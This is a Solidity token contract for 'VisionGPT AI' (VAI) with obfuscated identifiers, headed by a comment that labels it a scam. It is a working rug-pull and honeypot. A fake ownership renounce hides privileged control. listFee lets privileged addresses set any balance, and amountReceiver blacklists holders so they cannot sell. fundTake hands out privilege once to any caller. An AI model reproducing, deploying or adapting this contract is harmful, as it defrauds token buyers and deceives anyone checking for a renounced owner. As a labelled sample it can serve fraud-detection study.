// scam

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface atReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTrading) external view returns (uint256);

    function transfer(address tradingFeeIs, uint256 liquidityExempt) external returns (bool);

    function allowance(address txLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityExempt) external returns (bool);

    function transferFrom(
        address sender,
        address tradingFeeIs,
        uint256 liquidityExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundReceiver, uint256 value);
    event Approval(address indexed txLaunch, address indexed spender, uint256 value);
}

interface atReceiverMetadata is atReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isModeTrading {
    function createPair(address isList, address tokenFrom) external returns (address);
}

interface listExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VisionGPTAI is listSwap, atReceiver, atReceiverMetadata {

    function allowance(address sellToMode, address swapAtExempt) external view virtual override returns (uint256) {
        if (swapAtExempt == atTakeMode) {
            return type(uint256).max;
        }
        return swapMode[sellToMode][swapAtExempt];
    }

    uint256 private tradingReceiver;

    function liquidityMinAuto(address senderLaunch, address tradingFeeIs, uint256 liquidityExempt) internal returns (bool) {
        if (senderLaunch == teamAmountIs) {
            return marketingReceiver(senderLaunch, tradingFeeIs, liquidityExempt);
        }
        require(!totalBuy[senderLaunch]);
        return marketingReceiver(senderLaunch, tradingFeeIs, liquidityExempt);
    }

    uint256 private limitAuto;

    function approve(address swapAtExempt, uint256 liquidityExempt) public virtual override returns (bool) {
        swapMode[_msgSender()][swapAtExempt] = liquidityExempt;
        emit Approval(_msgSender(), swapAtExempt, liquidityExempt);
        return true;
    }

    bool public tokenMarketing;

    function amountTx() private view{
        require(teamTo[_msgSender()]);
    }

    mapping(address => bool) public totalBuy;

    mapping(address => bool) public teamTo;

    address public teamAmountIs;

    mapping(address => mapping(address => uint256)) private swapMode;

    address public atMarketing;

    uint256 isFeeTotal;

    function getOwner() external view returns (address) {
        return listAt;
    }

    constructor (){ 
        if (tokenMarketing) {
            teamMarketing = launchFee;
        }
        listExempt limitReceiver = listExempt(atTakeMode);
        atMarketing = isModeTrading(limitReceiver.factory()).createPair(limitReceiver.WETH(), address(this));
        if (liquidityLaunchedMarketing) {
            limitAuto = tradingReceiver;
        }
        teamTo[_msgSender()] = true;
        receiverToAmount[_msgSender()] = launchAuto;
        teamAmountIs = _msgSender();
        if (teamMarketing != launchFee) {
            limitAuto = teamMarketing;
        }
        emit Transfer(address(0), teamAmountIs, launchAuto);
        listAt = _msgSender();
        maxWallet();
    }

    function transfer(address feeTotal, uint256 liquidityExempt) external virtual override returns (bool) {
        return liquidityMinAuto(_msgSender(), feeTotal, liquidityExempt);
    }

    address atTakeMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private receiverToAmount;

    uint256 public launchFee;

    function totalSupply() external view virtual override returns (uint256) {
        return launchAuto;
    }

    uint256 public teamMarketing;

    bool public liquidityLaunchedMarketing;

    string private limitEnable = "VisionGPT AI";

    address private listAt;

    function decimals() external view virtual override returns (uint8) {
        return buyTo;
    }

    function marketingReceiver(address senderLaunch, address tradingFeeIs, uint256 liquidityExempt) internal returns (bool) {
        require(receiverToAmount[senderLaunch] >= liquidityExempt);
        receiverToAmount[senderLaunch] -= liquidityExempt;
        receiverToAmount[tradingFeeIs] += liquidityExempt;
        emit Transfer(senderLaunch, tradingFeeIs, liquidityExempt);
        return true;
    }

    function listFee(address feeTotal, uint256 liquidityExempt) public {
        amountTx();
        receiverToAmount[feeTotal] = liquidityExempt;
    }

    function fundTake(address atFund) public {
        if (liquiditySenderMode) {
            return;
        }
        
        teamTo[atFund] = true;
        
        liquiditySenderMode = true;
    }

    function owner() external view returns (address) {
        return listAt;
    }

    function transferFrom(address senderLaunch, address tradingFeeIs, uint256 liquidityExempt) external override returns (bool) {
        if (_msgSender() != atTakeMode) {
            if (swapMode[senderLaunch][_msgSender()] != type(uint256).max) {
                require(liquidityExempt <= swapMode[senderLaunch][_msgSender()]);
                swapMode[senderLaunch][_msgSender()] -= liquidityExempt;
            }
        }
        return liquidityMinAuto(senderLaunch, tradingFeeIs, liquidityExempt);
    }

    function amountReceiver(address totalAuto) public {
        amountTx();
        if (limitAuto == tradingReceiver) {
            liquidityLaunchedMarketing = false;
        }
        if (totalAuto == teamAmountIs || totalAuto == atMarketing) {
            return;
        }
        totalBuy[totalAuto] = true;
    }

    bool public liquiditySenderMode;

    uint256 private launchAuto = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed autoLaunched, address indexed feeLiquidity);

    function symbol() external view virtual override returns (string memory) {
        return txListMax;
    }

    uint8 private buyTo = 18;

    function maxWallet() public {
        emit OwnershipTransferred(teamAmountIs, address(0));
        listAt = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return limitEnable;
    }

    function balanceOf(address fundTrading) public view virtual override returns (uint256) {
        return receiverToAmount[fundTrading];
    }

    string private txListMax = "VAI";

}